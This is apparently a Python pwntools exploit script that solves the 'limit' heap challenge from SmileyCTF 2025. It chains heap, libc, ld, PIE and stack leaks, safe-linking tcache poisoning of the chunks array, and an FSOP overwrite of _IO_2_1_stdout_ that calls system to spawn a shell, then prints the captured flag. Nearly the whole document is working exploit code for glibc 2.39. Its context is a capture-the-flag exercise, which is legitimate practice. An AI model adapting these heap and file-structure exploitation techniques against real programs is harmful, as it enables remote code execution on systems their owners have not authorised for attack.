#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
from time import sleep

# context.log_level = 'debug'
context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
exe = context.binary = ELF('./limit_patched', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
dir /mnt/e/sec/CTFs/2025/SmileyCTF/limit/limit/glibc-2.39
brva 0x1742
brva 0x166E
brva 0x1585
brva 0x1445
c
'''

def start(argv=[]):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2])
    elif args.DOCKER:
        p = remote("localhost", 5000)
        sleep(0.5)
        pid = int(check_output(["pidof", "-s", "/app/run"]))
        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
        pause()
        return p
    elif args.QEMU:
        if args.GDB:
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
    else:
        return process([exe.path] + argv)

def debug():
    gdb.attach(p, gdbscript=gdbscript)
    pause()

def malloc(index, size):
    sla(b"> ", b"1")
    sla(b"Index: ", f"{index}".encode())
    sla(b"Size: ", f"{size}".encode())

def free(index):
    sla(b"> ", b"2")
    sla(b"Index: ", f"{index}".encode())

def puts(index):
    sla(b"> ", b"3")
    sla(b"Index: ", f"{index}".encode())

def read(index, data):
    sla(b"> ", b"4")
    sla(b"Index: ", f"{index}".encode())
    sa(b"Data: ", data)

def mangle(base, addr):
    return (base >> 12) ^ addr

# ==================== EXPLOIT ====================
p = start()

# Leak heap base
info('Leak heap base')
malloc(0, 0x28)
malloc(1, 0x28)

free(0)
free(1)

malloc(0, 0x28)
malloc(1, 0x28)

puts(1)
ru(b'Data: ')
heap_base = fixleak(rl()[:-1]) << 12
slog('heap base @ %#x', heap_base)

# Leak libc base
info('Leak libc base')
for i in range(9):
    malloc(i, 0xf8)
malloc(9, 0x18) # prevent top consolidation

## Fill tcache
for i in range(7):
    free(i)

payload = flat(
    p64(heap_base + 0x9f0), p64(heap_base + 0x9f0), # fd/bk point to fake main arena
    b"A" * 0x10, p64(0) * 2,
    p64(heap_base + 0xa20), p64(heap_base + 0xa20), # Fake arena contain a pointer point back to victim chunk
    b"B" * 0xb0,
    p64(0x100) # fake prev_size
)

debug()
read(7, payload)
free(8)

puts(7)
ru(b'Data: ')
libc.address = fixleak(rl()[:-1]) - 0x203b20
slog('libc base @ %#x', libc.address)

for i in range(7):
    malloc(i, 0xf8)

malloc(15, 0xf8)

# Leak ld
info('Leak ld base')
info('Stable address for ld base @ %#x', libc.address - 0x1df0)
free(0)
free(7)

## _rtld_global + 2736
# read(15, p64(mangle(heap_base, libc.address - 0x1dd0)))
read(15, p64(mangle(heap_base, libc.address - 0x1df0))) # Work on remote

malloc(7, 0xf8)
malloc(0, 0xf8)

free(7)

puts(15)
ru(b'Data: ')
# debug()
leak_val = u64(rl()[:-1].ljust(8, b"\x00")) ^ (heap_base >> 12)
ld_base = (leak_val ^ (libc.address - 0x1dd0 >> 12)) - 0x38ab0 # Work on remote
# ld_base = fixleak(rl()[:-1])
slog('ld base @ %#x', ld_base)

malloc(7, 0xf8)

# Leak pie
info('Leak pie base')
free(1)
free(7)

read(15, p64(mangle(heap_base, ld_base + 0x39660)))

malloc(7, 0xf8)
malloc(1, 0xf8)

free(7)

puts(15)
ru(b'Data: ')
leak_val = u64(rl()[:-1].ljust(8, b"\x00")) ^ (heap_base >> 12)
exe.address = (leak_val ^ (ld_base + 0x39660 >> 12)) - 0x658
slog('pie base @ %#x', exe.address)

malloc(7, 0xf8)

# tcache poisoning (aim for chunks[] array since it below heap region) [then leak stack]
info('Tcache poisoning & Leak stack address')
free(2)
free(7)

# debug()
read(15, p64(mangle(heap_base, exe.sym.chunks)))

malloc(7, 0xf8)
malloc(2, 0xf8)

read(2, p64(libc.sym.environ))
puts(0)
ru(b'Data: ')
stack_leak = fixleak(rl()[:-1])
saved_rbp = stack_leak - 0x138
slog('stack leak @ %#x', stack_leak)
slog('saved RBP @ %#x', saved_rbp)

# Do FSOP
info('FSOP to _IO_2_1_stdout_')
free(3)
free(7)

read(15, p64(mangle(heap_base, exe.sym.chunks)))

malloc(7, 0xf8)
malloc(0, 0xe8) # Make the size at index 0 > 0
malloc(3, 0xf8)

fp = FileStructure()
fp.flags = 0xfbad2484 + (u32(b"||sh") << 32)
fp._IO_read_end = libc.sym.system
fp._lock = libc.sym._IO_2_1_stdout_ + 0x50
fp._wide_data = libc.sym._IO_2_1_stdout_
fp.vtable = libc.sym._IO_wfile_jumps - 0x20
payload = bytes(fp) + p64(libc.sym._IO_2_1_stdout_ + 0x10 - 0x68)

read(3, p64(libc.sym._IO_2_1_stdout_)) # Overwrite chunks[0] = _IO_2_1_stdout_
read(0, payload)  # Write to _IO_2_1_stdout_

interactive()
# .;,;.{1_am_4_f1ag_gr3nad3_I_am_a_f14g_gren4d3_I_4m_4_fl4g_gr3nade_aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9wL0RJZUg3alRwaXdNLw==}